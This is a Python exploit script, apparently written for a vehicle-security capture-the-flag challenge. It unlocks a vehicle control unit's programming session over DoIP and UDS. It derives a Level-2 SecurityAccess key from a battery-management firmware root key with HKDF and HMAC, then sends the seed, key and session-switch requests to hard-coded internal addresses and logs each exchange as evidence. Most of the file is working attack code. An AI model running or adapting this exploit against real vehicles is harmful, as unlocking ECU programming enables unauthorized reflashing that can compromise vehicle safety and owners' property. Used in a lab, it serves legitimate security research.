#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Challenge 08 -- unlock the VCU programming session.

Chain (per challenge text):
    BMS firmware -> root key
      -> HKDF-SHA256(ikm=root, salt=SHA256(full image), info=VIN, L=32)
      -> Level-2 SecurityAccess key = HMAC over the seed
      -> 27 02 <key>  ==> expected 67 02
      -> 10 02       ==> programming session

This driver speaks DoIP (ISO 13400-2) + UDS to the VCU, either:
  * directly  --transport tcp --host 10.224.139.7 --port 8080
  * via the CGW DoIP gateway --transport doip --host 10.229.221.2 --port 13400 --target-la 0x1001

Because the VCU is currently unreachable at IP level, --dry-run is the default
and prints the exact byte sequence that will be sent. That makes the exploit
reproducible as text even while the host is down.

Usage
-----
  # show the exact plan without touching the network
  python unlock_vcu.py --dry-run --seed 11223344 --key a1b2c3d4

  # once the VCU is reachable
  python unlock_vcu.py --transport doip --target-la 0x1001 \
      --seed 11223344 --key a1b2c3d4 --execute

  # let derive_key.py compute the key from a firmware image
  python unlock_vcu.py --transport doip --target-la 0x1001 \
      --firmware ../bms/bms.bin --vin CV6FF52FEE9EDDD86 \
      --derive cand=K4 --execute

Exit codes
----------
  0  programming session unlocked (saw 67 02 and 50 02)
  1  ran but did not unlock (see transcript)
  2  usage / environment error
  3  dry-run completed (no network I/O)
"""

import argparse
import binascii
import json
import os
import socket
import struct
import sys
import time

ROOT = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
EVID_DIR = os.path.join(ROOT, "03_EVIDENCE", "vcu")

# ------------------------------------------------------------------ DoIP
DOIP_PROTO = b"\x02\xfd"
T_VEHICLE_ID_REQ = 0x0001
T_VEHICLE_ID_RES = 0x0004
T_ROUTING_ACT_REQ = 0x0005
T_ROUTING_ACT_RES = 0x0006
T_DIAG_MSG = 0x8001
T_DIAG_ACK = 0x8002
T_DIAG_NAK = 0x8003

UDS_NRC = {
    0x10: "generalReject",
    0x11: "serviceNotSupported",
    0x12: "subFunctionNotSupported",
    0x13: "incorrectMessageLengthOrInvalidFormat",
    0x14: "responseTooLong",
    0x21: "busyRepeatRequest",
    0x22: "conditionsNotCorrect",
    0x24: "requestSequenceError",
    0x31: "requestOutOfRange",
    0x33: "securityAccessDenied",
    0x34: "authenticationRequired",
    0x35: "invalidKey",
    0x36: "exceedNumberOfAttempts",
    0x37: "requiredTimeDelayNotExpired",
    0x70: "uploadDownloadNotAccepted",
    0x71: "transferDataSuspended",
    0x72: "generalProgrammingFailure",
    0x73: "wrongBlockSequenceCounter",
    0x78: "responsePending",
    0x7E: "subFunctionNotSupportedInActiveSession",
    0x7F: "serviceNotSupportedInActiveSession",
}


def hx(b):
    return binascii.hexlify(b).decode() if b else ""


def unhex(s):
    return binascii.unhexlify(s.replace(" ", "").replace("0x", ""))


def doip_msg(mtype, payload=b""):
    return DOIP_PROTO + struct.pack(">H", mtype) + struct.pack(">I", len(payload)) + payload


def recv_exact(sock, n, deadline):
    buf = b""
    while len(buf) < n:
        if time.time() > deadline:
            break
        try:
            chunk = sock.recv(n - len(buf))
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
    return buf


def recv_doip(sock, timeout):
    deadline = time.time() + timeout
    hdr = recv_exact(sock, 8, deadline)
    if len(hdr) < 8:
        return None, b"", hdr
    _, _, mtype, plen = struct.unpack(">BBHI", hdr)
    payload = recv_exact(sock, plen, deadline) if plen else b""
    return mtype, payload, hdr + payload


# ------------------------------------------------------------------ transcript
class Transcript:
    """Every exchange is one row; a row is the evidence record."""

    def __init__(self, label):
        self.label = label
        self.rows = []
        self.t0 = time.time()

    def add(self, step, tx, rx, note=""):
        self.rows.append({
            "step": step,
            "tx": hx(tx) if isinstance(tx, bytes) else tx,
            "rx": hx(rx) if isinstance(rx, bytes) else rx,
            "note": note,
            "t_ms": round((time.time() - self.t0) * 1000, 1),
        })
        return self.rows[-1]

    def dump(self):
        return {
            "label": self.label,
            "ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
            "rows": self.rows,
        }

    def save(self, tag=None):
        os.makedirs(EVID_DIR, exist_ok=True)
        name = "E-vcu-%s.json" % (tag or self.label)
        path = os.path.join(EVID_DIR, name)
        with open(path, "w", encoding="utf-8") as f:
            json.dump(self.dump(), f, indent=1)
        return path


# ------------------------------------------------------------------ UDS helpers
def uds_expect(resp_hex, service, sub=None):
    """Classify a raw UDS response hex string."""
    raw = unhex(resp_hex) if isinstance(resp_hex, str) else resp_hex
    if not raw:
        return "NO_RESPONSE", None
    if raw[0] == 0x7F:
        nrc = raw[2] if len(raw) > 2 else 0
        return "NEGATIVE", {"service": raw[1], "nrc": nrc, "meaning": UDS_NRC.get(nrc, "unknown")}
    if raw[0] == (service + 0x40) & 0xFF:
        d = {"service": raw[0]}
        if len(raw) > 1:
            d["sub"] = raw[1]
        d["data"] = hx(raw[2:])
        return "POSITIVE", d
    return "UNEXPECTED", {"raw": hx(raw)}


def build_plan(seed_hex, key_hex):
    """The exact request sequence for challenge 08. Pure data, no I/O."""
    plan = [
        ("diag_session_extended", "1003", "enter extended session (precondition for 27)"),
        ("security_level1_seed", "2701", "request Level-1 seed"),
        ("security_level2_seed", "2701_ALT", "if Level-2 uses its own odd sub (27 03 / 27 05 ...)"),
        ("security_level2_key", "2702" + key_hex, "send Level-2 key computed from the seed"),
        ("diag_session_programming", "1002", "switch to programming session -- success = 50 02"),
    ]
    return plan


# ------------------------------------------------------------------ transports
class DoipLink:
    """UDS over DoIP to one logical address, through a DoIP entity (gateway or ECU)."""

    def __init__(self, host, port, src_la, target_la, ra_type=0x00, verbose=True):
        self.host = host
        self.port = port
        self.src_la = src_la
        self.target_la = target_la
        self.ra_type = ra_type
        self.verbose = verbose
        self.sock = None
        self.activated = False

    def connect(self):
        self.sock = socket.create_connection((self.host, self.port), timeout=8)
        self.sock.settimeout(8)
        return self

    def activate(self, tr):
        payload = struct.pack(">H", self.src_la) + bytes([self.ra_type]) + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00"
        msg = doip_msg(T_ROUTING_ACT_REQ, payload)
        self.sock.sendall(msg)
        mtype, pl, raw = recv_doip(self.sock, 8)
        code = pl[4] if pl and len(pl) >= 5 else None
        tr.add("routing_activation", msg, raw,
               "src=0x%04X code=%s" % (self.src_la, "0x%02X" % code if code is not None else "none"))
        self.activated = (code == 0x10)
        return self.activated

    def uds(self, tr, uds_hex, step, timeout=6):
        """Send one UDS request; follow 7F xx 78 responsePending until final."""
        uds = unhex(uds_hex)
        payload = struct.pack(">H", self.src_la) + struct.pack(">H", self.target_la) + uds
        msg = doip_msg(T_DIAG_MSG, payload)
        self.sock.sendall(msg)
        collected = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            mtype, pl, raw = recv_doip(self.sock, max(0.2, deadline - time.time()))
            if mtype is None:
                break
            if mtype == T_DIAG_ACK:
                continue
            if mtype == T_DIAG_NAK:
                tr.add(step, msg, raw, "diagnostic negative ack")
                return None
            if mtype == T_DIAG_MSG and len(pl) >= 4:
                body = pl[4:]
                collected = body
                if len(body) >= 3 and body[0] == 0x7F and body[2] == 0x78:
                    tr.add(step, msg, raw, "responsePending, waiting")
                    deadline = time.time() + timeout
                    continue
                tr.add(step, msg, raw, "final")
                return body
        tr.add(step, msg, collected, "timeout")
        return collected or None

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


class TcpLink:
    """Bare UDS over TCP (some benches expose a raw UDS socket)."""

    def __init__(self, host, port):
        self.host, self.port = host, port
        self.sock = None

    def connect(self):
        self.sock = socket.create_connection((self.host, self.port), timeout=8)
        self.sock.settimeout(6)
        return self

    def activate(self, tr):
        tr.add("activate", "", "", "bare TCP transport, no routing activation")
        return True

    def uds(self, tr, uds_hex, step, timeout=6):
        uds = unhex(uds_hex)
        self.sock.sendall(uds)
        try:
            body = self.sock.recv(4096)
        except socket.timeout:
            body = b""
        tr.add(step, uds, body, "tcp raw")
        return body

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


# ------------------------------------------------------------------ main flow
def derive_key_via_bms(firmware, vin, seed_hex, cand=None):
    """Delegate to 04_SOLVE/bms/derive_key.py so there is exactly one crypto impl."""
    sys.path.insert(0, os.path.join(ROOT, "04_SOLVE", "bms"))
    try:
        import derive_key as dk
    except Exception as e:
        print("[!] cannot import 04_SOLVE/bms/derive_key.py: %s" % e, file=sys.stderr)
        return None
    if not hasattr(dk, "derive_all"):
        print("[!] derive_key.py has no derive_all(); expected signature "
              "derive_all(firmware_path, vin, seed_hex) -> list of (name, key_hex)", file=sys.stderr)
        return None
    results = dk.derive_all(firmware, vin, seed_hex)
    if cand:
        for name, key in results:
            if name == cand:
                return key
        print("[!] candidate %r not produced; available: %s"
              % (cand, ", ".join(n for n, _ in results)), file=sys.stderr)
        return None
    # default: K4 = HMAC truncated to seed length (standard UDS)
    for name, key in results:
        if name.startswith("K4"):
            return key
    return results[0][1] if results else None


def main():
    ap = argparse.ArgumentParser(description="Challenge 08 -- unlock the VCU programming session")
    ap.add_argument("--transport", choices=["doip", "tcp"], default="doip")
    ap.add_argument("--host", default=None, help="default: 10.229.221.2 for doip, 10.224.139.7 for tcp")
    ap.add_argument("--port", type=int, default=None, help="default: 13400 for doip, 8080 for tcp")
    ap.add_argument("--src-la", default="0x0E00", help="DoIP tester logical address")
    ap.add_argument("--target-la", default="0x1001", help="VCU logical address behind the gateway")
    ap.add_argument("--ra-type", default="0x00", help="routing activation type")
    ap.add_argument("--seed", default=None, help="Level-2 seed hex as returned by 27 xx (test hook)")
    ap.add_argument("--key", default=None, help="precomputed Level-2 key hex")
    ap.add_argument("--firmware", default=None, help="BMS image; derive the key from it")
    ap.add_argument("--vin", default="CV6FF52FEE9EDDD86")
    ap.add_argument("--derive", default=None, help="candidate name from derive_key.py, e.g. K4")
    ap.add_argument("--execute", action="store_true", help="actually talk to the network")
    ap.add_argument("--dry-run", action="store_true", help="print the plan only (default)")
    ap.add_argument("--tag", default=None, help="evidence file tag")
    args = ap.parse_args()

    execute = args.execute and not args.dry_run
    host = args.host or ("10.229.221.2" if args.transport == "doip" else "10.224.139.7")
    port = args.port or (13400 if args.transport == "doip" else 8080)

    key_hex = args.key
    if not key_hex and args.firmware:
        key_hex = derive_key_via_bms(args.firmware, args.vin, args.seed or "", args.derive)
        if key_hex:
            print("[*] derived key from %s: %s" % (args.firmware, key_hex))
    if not key_hex:
        key_hex = "<KEY_32B_HEX_PLACEHOLDER>"

    plan = build_plan(args.seed or "<SEED>", key_hex)
    print("=== challenge 08 plan (%s %s:%d -> LA %s) ===" % (args.transport, host, port, args.target_la))
    for name, uds, note in plan:
        print("  %-26s %-40s %s" % (name, uds, note))

    if not execute:
        tr = Transcript(args.tag or "dryrun")
        for name, uds, note in plan:
            tr.add(name, uds, "", "DRY-RUN " + note)
        p = tr.save()
        print("\n[*] dry-run: wrote %s" % p)
        print("[*] re-run with --execute once the VCU answers at %s:%d" % (host, port))
        return 3

    tr = Transcript(args.tag or ("run-%s" % time.strftime("%H%M%S")))
    if args.transport == "doip":
        link = DoipLink(host, port, int(args.src_la, 16), int(args.target_la, 16), int(args.ra_type, 16))
    else:
        link = TcpLink(host, port)

    unlocked = False
    try:
        link.connect()
        if not link.activate(tr):
            print("[!] routing activation failed; continuing anyway")
        # 1. extended session
        body = link.uds(tr, "1003", "diag_session_extended")
        kind, info = uds_expect(hx(body) if body else "", 0x10)
        print("[1] 10 03 -> %s %s" % (kind, info))
        # 2. level-1 seed (some benches gate level-2 behind level-1)
        body = link.uds(tr, "2701", "security_level1_seed")
        kind, info = uds_expect(hx(body) if body else "", 0x27)
        print("[2] 27 01 -> %s %s" % (kind, info))
        # 3. level-2 key
        body = link.uds(tr, "2702" + key_hex, "security_level2_key")
        kind, info = uds_expect(hx(body) if body else "", 0x27)
        print("[3] 27 02 %s -> %s %s" % (key_hex, kind, info))
        if kind == "POSITIVE" and isinstance(info, dict) and info.get("sub") == 0x02:
            unlocked = True
        # 4. programming session
        body = link.uds(tr, "1002", "diag_session_programming")
        kind, info = uds_expect(hx(body) if body else "", 0x10)
        print("[4] 10 02 -> %s %s" % (kind, info))
        if kind == "POSITIVE" and isinstance(info, dict) and info.get("sub") == 0x02:
            unlocked = True
    except Exception as e:
        print("[!] transport error: %s" % e)
        tr.add("error", "", "", str(e))
    finally:
        link.close()
        p = tr.save()
        print("[*] transcript -> %s" % p)
        print("[*] %s" % ("UNLOCKED" if unlocked else "NOT unlocked"))
        return 0 if unlocked else 1


if __name__ == "__main__":
    sys.exit(main())
